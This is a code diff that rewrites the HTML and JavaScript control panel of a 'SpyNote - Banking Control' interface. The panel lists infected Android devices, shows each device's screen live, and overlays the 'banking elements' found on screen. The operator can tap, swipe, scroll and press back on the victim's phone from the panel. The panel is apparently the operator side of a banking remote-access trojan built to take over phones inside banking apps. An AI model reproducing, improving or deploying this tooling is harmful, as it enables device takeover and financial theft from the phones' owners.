@@ -1,329 +1,308 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote Banking Control</title>
+    <title>📱 SpyNote - Banking Control</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: Arial, sans-serif; 
-            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
-            color: white; height: 100vh; overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            background: #0a0a0a; color: white; height: 100vh; overflow: hidden;
         }
-        #devices {
-            position: fixed; top: 10px; left: 10px; 
-            background: rgba(0,0,0,0.9); padding: 15px; 
-            max-height: 80vh; overflow-y: auto; width: 300px; 
-            border-radius: 10px; backdrop-filter: blur(10px);
+        #sidebar { 
+            position: fixed; top: 0; left: 0; width: 320px; height: 100vh; 
+            background: rgba(20,20,20,0.98); backdrop-filter: blur(20px);
+            padding: 20px; overflow-y: auto;
         }
-        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
-            border-radius: 8px; transition: all 0.3s; }
-        .device:hover { background: #555; transform: translateX(5px); }
-        .active { background: #00ff88 !important; color: #000; }
+        #devices h3 { margin-bottom: 15px; color: #00ff88; }
+        .device { 
+            padding: 15px; margin: 10px 0; background: #2a2a2a; 
+            border-radius: 12px; cursor: pointer; transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+        .device:hover { background: #3a3a3a; border-color: #00ff88; }
+        .device.active { background: #00ff88 !important; color: #000; border-color: #00cc66; }
 
-        #phone-frame {
-            width: 400px; height: 800px; margin: 20px auto; 
-            background: #000; border: 25px solid #333; border-radius: 50px; 
-            position: relative; cursor: pointer; touch-action: none;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        #main { margin-left: 340px; height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
+        #phone { 
+            width: 380px; height: 780px; background: #111; 
+            border: 30px solid #222; border-radius: 60px 60px 40px 40px;
+            position: relative; cursor: pointer; box-shadow: 0 30px 60px rgba(0,0,0,0.8);
         }
-        #screen { 
-            width: 100%; height: 100%; background: #111; border-radius: 20px;
-            image-rendering: pixelated; position: relative;
+        #canvas { 
+            width: 100%; height: 100%; border-radius: 25px;
+            background: #000; position: relative;
         }
 
-        /* 🔥 BANKING LAYOUT OVERLAY */
-        .ui-element {
-            position: absolute; border-radius: 4px; font-size: 11px; 
-            padding: 2px 4px; cursor: pointer; backdrop-filter: blur(5px);
-            border: 1px solid rgba(255,255,255,0.3); transition: all 0.2s;
+        /* 🔥 UI OVERLAY */
+        .ui-overlay {
+            position: absolute; border-radius: 6px; font-size: 12px; 
+            font-weight: bold; padding: 4px 6px; cursor: pointer; 
+            backdrop-filter: blur(10px); border: 2px solid rgba(255,255,255,0.4);
+            transition: all 0.2s; pointer-events: all;
         }
-        .ui-text { background: rgba(0,255,136,0.8); color: #000; }
-        .ui-button { background: rgba(255,107,53,0.9); color: white; }
-        .ui-search { background: rgba(59,130,246,0.9); color: white; }
-        .ui-element:hover { transform: scale(1.2); box-shadow: 0 0 10px rgba(0,255,136,0.8); }
-        .ui-element.clickable { border: 2px solid #ffeb3b; }
+        .ui-text { background: rgba(0,255,150,0.85); color: #000; }
+        .ui-button { background: rgba(255,100,50,0.9); color: white; }
+        .ui-input { background: rgba(100,150,255,0.9); color: white; }
+        .ui-overlay:hover { transform: scale(1.1) !important; box-shadow: 0 0 20px rgba(0,255,150,0.8); }
 
-        #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
-        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
-            padding: 10px; border-radius: 5px; font-size: 12px; }
-        #controls { text-align: center; position: fixed; bottom: 20px; 
-            left: 50%; transform: translateX(-50%); }
+        #status-bar { 
+            position: fixed; top: 20px; right: 20px; 
+            background: rgba(0,0,0,0.9); padding: 15px 20px; 
+            border-radius: 20px; font-size: 14px; min-width: 200px;
+        }
+        #controls { 
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+            display: flex; gap: 15px;
+        }
         button {
-            padding: 12px 25px; margin: 0 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
-            color: white; border: none; border-radius: 20px; cursor: pointer; 
-            font-size: 14px; font-weight: bold; transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
+            padding: 15px 25px; background: linear-gradient(45deg, #00d4ff, #0099cc); 
+            color: white; border: none; border-radius: 30px; cursor: pointer; 
+            font-weight: bold; transition: all 0.3s; box-shadow: 0 10px 30px rgba(0,212,255,0.4);
         }
-        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
-        button.active { background: linear-gradient(45deg, #00ff88, #00cc66); }
-        .scroll-btn { background: linear-gradient(45deg, #ff6b35, #e55a2b) !important; }
-        #element-list { 
-            position: fixed; bottom: 100px; left: 20px; 
-            background: rgba(0,0,0,0.95); padding: 15px; 
-            max-height: 200px; overflow-y: auto; width: 280px; 
-            border-radius: 10px; display: none;
+        button:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(0,212,255,0.6); }
+        .scroll-mode { background: linear-gradient(45deg, #ff6b35, #ff4757) !important; }
+        #layout-toggle { background: linear-gradient(45deg, #00ff88, #00cc66) !important; }
+
+        #elements-panel {
+            position: fixed; bottom: 120px; left: 20px; width: 300px; 
+            background: rgba(0,0,0,0.95); padding: 20px; border-radius: 15px;
+            max-height: 300px; overflow-y: auto; display: none;
         }
-        .element-item { 
-            padding: 8px; margin: 4px 0; background: #444; 
-            cursor: pointer; border-radius: 6px; font-size: 12px;
+        .element { 
+            padding: 12px; margin: 8px 0; background: #333; 
+            border-radius: 10px; cursor: pointer; transition: all 0.2s;
         }
-        .element-item:hover { background: #666; }
+        .element:hover { background: #00ff88; color: #000; transform: scale(1.02); }
     </style>
 </head>
 <body>
-    <div id="devices">
-        <h3>📱 Banking Control</h3>
-        <div id="device-list">Loading...</div>
-    </div>
-    
-    <div id="status">
-        <div>Status: <span id="connectionStatus">Connecting...</span></div>
-        <div>FPS: <span id="fps">0</span> | <span id="selectedDevice">-</span></div>
-    </div>
-    <div id="fps-counter">FPS: 0</div>
-
-    <div id="phone-frame">
-        <canvas id="screen"></canvas>
+    <div id="sidebar">
+        <h3>📱 Live Devices</h3>
+        <div id="device-list">Connecting...</div>
     </div>
 
-    <div id="element-list">
-        <h4>🔍 Found Elements:</h4>
-        <div id="elements"></div>
+    <div id="status-bar">
+        <div>🔗 <span id="status">Connecting...</span></div>
+        <div>📊 FPS: <span id="fps">0</span> | Device: <span id="device-name">-</span></div>
+    </div>
+
+    <div id="main">
+        <div id="phone">
+            <canvas id="canvas"></canvas>
+        </div>
+    </div>
+
+    <div id="elements-panel">
+        <h4>🔍 Banking Elements</h4>
+        <div id="element-list"></div>
     </div>
 
     <div id="controls">
-        <button onclick="toggleLayoutOverlay()" id="layoutBtn">👁️ Layout</button>
+        <button onclick="toggleElements()" id="elementsBtn">🔍 Elements</button>
         <button onclick="sendBack()" id="backBtn">🔙 Back</button>
         <button onclick="toggleScroll()" id="scrollBtn">↕️ Scroll</button>
+        <button onclick="toggleLayout()" id="layoutBtn">👁️ Overlay</button>
     </div>
 
     <script>
-        const socket = io({ transports: ['websocket'] });
+        const socket = io({ transports: ['websocket', 'polling'], forceNew: true });
         let currentDevice = null;
-        let deviceWidth = 1080, deviceHeight = 1920;
-        let lastFrameTime = 0, frameCount = 0;
-        let scrollMode = false;
-        let showLayout = true;
+        let deviceW = 1080, deviceH = 2400;
+        let frameCount = 0, lastTime = 0;
+        let scrollMode = false, showOverlay = true, showElements = false;
         let uiElements = [];
-        let dragging = false;
-        let startX = 0, startY = 0;
 
-        const canvas = document.getElementById('screen');
+        const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
-        const phoneFrame = document.getElementById('phone-frame');
-        const deviceList = document.getElementById('device-list');
-        const connectionStatus = document.getElementById('connectionStatus');
-        const selectedDevice = document.getElementById('selectedDevice');
-        const fpsCounter = document.getElementById('fps-counter');
-        const fpsDisplay = document.getElementById('fps');
-        const elementList = document.getElementById('element-list');
-        const elementsDiv = document.getElementById('elements');
+        const phone = document.getElementById('phone');
 
         socket.on('connect', () => {
-            connectionStatus.textContent = '✅ Connected';
-            connectionStatus.style.color = '#00ff88';
+            document.getElementById('status').textContent = '✅ LIVE';
+            document.getElementById('status').style.color = '#00ff88';
+            loadDevices();
         });
 
         socket.on('devices-update', (devices) => {
-            updateDeviceList(devices);
+            updateDevices(devices);
         });
 
-        // 🔥 LIVE SCREEN
+        // 🔥 SCREEN + LAYOUT
         socket.on('screen-update', (data) => {
-            if (data.deviceId !== currentDevice) return;
+            if (!currentDevice || data.deviceId !== currentDevice) return;
             
             try {
-                deviceWidth = data.width;
-                deviceHeight = data.height;
+                deviceW = data.width;
+                deviceH = data.height;
                 
                 const img = new Image();
                 img.onload = () => {
-                    const rect = phoneFrame.getBoundingClientRect();
+                    const rect = phone.getBoundingClientRect();
                     canvas.width = rect.width;
                     canvas.height = rect.height;
                     
                     ctx.imageSmoothingEnabled = false;
-                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                     
-                    // 🔥 DRAW LAYOUT OVERLAY
-                    drawLayoutOverlay(rect);
+                    if (showOverlay) drawOverlay();
                     
                     frameCount++;
                     const now = performance.now();
-                    if (now - lastFrameTime >= 1000) {
-                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
-                        fpsCounter.textContent = `FPS: ${fps}`;
-                        fpsDisplay.textContent = fps;
+                    if (now - lastTime > 1000) {
+                        document.getElementById('fps').textContent = Math.round(frameCount * 1000 / (now - lastTime));
                         frameCount = 0;
-                        lastFrameTime = now;
+                        lastTime = now;
                     }
                 };
-                img.src = 'data:image/jpeg;base64,' + data.data;
-            } catch (e) {
-                console.error('Screen error:', e);
-            }
+                img.src = `data:image/jpeg;base64,${data.data}`;
+            } catch(e) { console.error('Frame error:', e); }
         });
 
-        // 🔥 BANKING LAYOUT DATA
         socket.on('ui-layout-update', (data) => {
             if (data.deviceId !== currentDevice) return;
             uiElements = data.elements || [];
-            updateElementList();
+            if (showElements) updateElementList();
         });
 
-        fetch('/devices').then(r => r.json()).then(updateDeviceList);
+        function loadDevices() {
+            fetch('/devices').then(r=>r.json()).then(updateDevices);
+        }
 
-        function updateDeviceList(devices) {
-            deviceList.innerHTML = devices.length ? 
+        function updateDevices(devices) {
+            document.getElementById('device-list').innerHTML = devices.length ? 
                 devices.map(([id, info]) => `
-                    <div class="device" onclick="selectDevice('${id}', this)">
-                        <b>${info.model || id.slice(0,8)}</b><br>
-                        <small>${info.brand} ${info.version || ''}</small>
-                        🟢 LIVE
+                    <div class="device ${currentDevice === id ? 'active' : ''}" 
+                         onclick="selectDevice('${id}')">
+                        <b>${info.model?.slice(0,20) || id.slice(0,8)}</b><br>
+                        <small>${info.brand || ''} ${info.version || ''}</small><br>
+                        <span style="color: ${info.connected ? '#00ff88' : '#ff4444'}">
+                            ${info.connected ? '🟢 LIVE' : '🔴 OFF'}
+                        </span>
                     </div>
-                `).join('') : 'No devices';
+                `).join('') : '<div>No devices online</div>';
         }
 
-        function selectDevice(deviceId, el) {
-            currentDevice = deviceId;
-            selectedDevice.textContent = deviceId.slice(0,8);
-            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
-            el.classList.add('active');
+        function selectDevice(id) {
+            currentDevice = id;
+            document.getElementById('device-name').textContent = id.slice(0,12);
+            updateDevices(Array.from(devices.values())); // Refresh visual
+            // Clear old overlays
+            document.querySelectorAll('.ui-overlay').forEach(el => el.remove());
         }
 
-        function getScaledCoords(clientX, clientY) {
-            const rect = phoneFrame.getBoundingClientRect();
-            const scaleX = deviceWidth / rect.width;
-            const scaleY = deviceHeight / rect.height;
+        // 🔥 COORDINATE SCALING
+        function getDeviceCoords(clientX, clientY) {
+            const rect = phone.getBoundingClientRect();
             return {
-                x: Math.floor((clientX - rect.left) * scaleX),
-                y: Math.floor((clientY - rect.top) * scaleY)
+                x: ((clientX - rect.left) / rect.width * deviceW),
+                y: ((clientY - rect.top) / rect.height * deviceH)
             };
         }
 
-        // 🔥 DRAW LAYOUT OVERLAY
-        function drawLayoutOverlay(rect) {
-            if (!showLayout || uiElements.length === 0) return;
+        // 🔥 DRAW UI OVERLAY
+        function drawOverlay() {
+            document.querySelectorAll('.ui-overlay').forEach(el => el.remove());
             
-            const scaleX = rect.width / deviceWidth;
-            const scaleY = rect.height / deviceHeight;
+            const rect = phone.getBoundingClientRect();
+            const scaleX = rect.width / deviceW;
+            const scaleY = rect.height / deviceH;
             
-            uiElements.forEach(el => {
-                const overlay = document.getElementById(`ui-${el.id}`);
-                if (!overlay) {
-                    const div = document.createElement('div');
-                    div.id = `ui-${el.id}`;
-                    div.className = `ui-element ui-${el.type}`;
-                    div.textContent = el.text || el.className || '?';
-                    div.style.left = `${el.bounds.left * scaleX}px`;
-                    div.style.top = `${el.bounds.top * scaleY}px`;
-                    div.style.width = `${(el.bounds.right - el.bounds.left) * scaleX}px`;
-                    div.style.height = `${(el.bounds.bottom - el.bounds.top) * scaleY}px`;
-                    div.onclick = () => clickElement(el);
-                    document.getElementById('screen').appendChild(div);
-                }
+            uiElements.forEach((el, i) => {
+                const div = document.createElement('div');
+                div.className = `ui-overlay ui-${el.type || 'text'}`;
+                div.innerHTML = el.text?.slice(0,15) || el.className || '?';
+                div.style.left = `${el.bounds?.left * scaleX}px`;
+                div.style.top = `${el.bounds?.top * scaleY}px`;
+                div.style.width = `${(el.bounds?.right - el.bounds?.left) * scaleX}px`;
+                div.style.height = `${(el.bounds?.bottom - el.bounds?.top) * scaleY}px`;
+                div.onclick = (e) => {
+                    e.stopPropagation();
+                    tapElement(el);
+                };
+                canvas.parentNode.appendChild(div);
             });
         }
 
-        function updateElementList() {
-            elementsDiv.innerHTML = uiElements.map(el => `
-                <div class="element-item" onclick="clickElementByText('${el.text || el.className}')">
-                    ${el.type === 'button' ? '🔘' : el.type === 'text' ? '📝' : '🔍'}
-                    ${el.text || el.className || 'Unknown'} (${Math.round(el.bounds.left)},${Math.round(el.bounds.top)})
-                </div>
-            `).join('');
-        }
-
-        function clickElement(element) {
-            sendControl('tap', element.bounds.centerX, element.bounds.centerY, element.text);
-        }
-
-        function clickElementByText(text) {
-            const el = uiElements.find(e => (e.text || e.className || '').includes(text));
-            if (el) clickElement(el);
-        }
-
-        // 🔥 Touch Controls
-        ['mousedown', 'touchstart'].forEach(event => {
-            phoneFrame.addEventListener(event, e => {
+        // 🔥 TOUCH + MOUSE CONTROLS
+        let dragStart = {x:0, y:0}, isDragging = false;
+        
+        ['touchstart', 'mousedown'].forEach(ev => {
+            phone.addEventListener(ev, e => {
                 e.preventDefault();
-                dragging = true;
-                const coords = getScaledCoords(
+                isDragging = true;
+                const coords = getDeviceCoords(
                     e.touches?.[0]?.clientX || e.clientX,
                     e.touches?.[0]?.clientY || e.clientY
                 );
-                startX = coords.x; startY = coords.y;
+                dragStart = coords;
             });
         });
 
-        ['mousemove', 'touchmove'].forEach(event => {
-            phoneFrame.addEventListener(event, e => {
-                if (!dragging || !currentDevice) return;
+        ['touchmove', 'mousemove'].forEach(ev => {
+            phone.addEventListener(ev, e => {
+                if (!isDragging || !currentDevice) return;
                 e.preventDefault();
-                const coords = getScaledCoords(
+                const coords = getDeviceCoords(
                     e.touches?.[0]?.clientX || e.clientX,
                     e.touches?.[0]?.clientY || e.clientY
                 );
                 
                 if (scrollMode) {
-                    const scrollDistance = coords.y - startY;
-                    sendControl('scroll', 0, scrollDistance);
+                    sendControl('scroll', 0, coords.y - dragStart.y);
                 } else {
-                    sendControl('swipe', startX, startY, coords.x, coords.y);
+                    sendControl('swipe', dragStart.x, dragStart.y, coords.x, coords.y);
                 }
             });
         });
 
-        ['mouseup', 'touchend'].forEach(event => {
-            phoneFrame.addEventListener(event, e => {
-                if (!dragging || !currentDevice) return;
-                dragging = false;
+        ['touchend', 'mouseup'].forEach(ev => {
+            phone.addEventListener(ev, e => {
+                if (!isDragging || !currentDevice) return;
+                isDragging = false;
                 
-                if (!scrollMode) {
-                    sendControl('tap', startX, startY);
+                if (!scrollMode && Math.abs(e.changedTouches?.[0]?.clientX - dragStart.x*10) < 50) {
+                    sendControl('tap', dragStart.x, dragStart.y);
                 }
             });
         });
 
-        function sendControl(action, x, y, endX, endY, scrollDistance, elementText) {
+        function sendControl(action, x=0, y=0, endX=0, endY=0, scroll=0) {
+            if (!currentDevice) return;
             socket.emit('control', { 
-                deviceId: currentDevice, 
-                action, 
-                x, y, 
-                endX, endY, 
-                scrollDistance,
-                elementText
+                deviceId: currentDevice, action, x, y, endX, endY, scrollDistance: scroll 
             });
         }
 
-        function sendTap(x, y) {
-            sendControl('tap', x, y);
+        function tapElement(el) {
+            sendControl('tap', el.bounds.centerX, el.bounds.centerY);
         }
 
-        function sendSwipe(sx, sy, ex, ey) {
-            sendControl('swipe', sx, sy, ex, ey);
+        function sendBack() { sendControl('back'); }
+        function toggleScroll() { 
+            scrollMode = !scrollMode; 
+            document.getElementById('scrollBtn').classList.toggle('scroll-mode', scrollMode);
+            document.getElementById('scrollBtn').textContent = scrollMode ? '👆 Tap' : '↕️ Scroll';
+        }
+        function toggleLayout() { 
+            showOverlay = !showOverlay; 
+            document.getElementById('layoutBtn').textContent = showOverlay ? '🙈 Hide' : '👁️ Show';
+            if (showOverlay) drawOverlay();
+            else document.querySelectorAll('.ui-overlay').forEach(el => el.remove());
+        }
+        function toggleElements() {
+            showElements = !showElements;
+            document.getElementById('elements-panel').style.display = showElements ? 'block' : 'none';
+            if (showElements) updateElementList();
         }
 
-        function sendScroll(distance) {
-            sendControl('scroll', 0, distance);
-        }
-
-        function sendBack() {
-            sendControl('back');
-        }
-
-        function toggleScroll() {
-            scrollMode = !scrollMode;
-            document.getElementById('scrollBtn').textContent = scrollMode ? '👆 Normal' : '↕️ Scroll';
-        }
-
-        function toggleLayoutOverlay() {
-            showLayout = !showLayout;
-            document.querySelectorAll('.ui-element').forEach(el => el.remove());
-            document.getElementById('layoutBtn').textContent = showLayout ? '🙈 Hide' : '👁️ Layout';
-            document.getElementById('element-list').style.display = showLayout ? 'block' : 'none';
+        function updateElementList() {
+            document.getElementById('element-list').innerHTML = uiElements.map(el => `
+                <div class="element" onclick="tapElement(${JSON.stringify(el).replace(/"/g, '&quot;')})">
+                    ${el.type === 'button' ? '🔘' : '📝'} ${el.text?.slice(0,25) || el.className || 'Element'}
+                    <br><small>(${Math.round(el.bounds?.left)}, ${Math.round(el.bounds?.top)})</small>
+                </div>
+            `).join('') || '<div>No elements found</div>';
         }
     </script>
 </body>
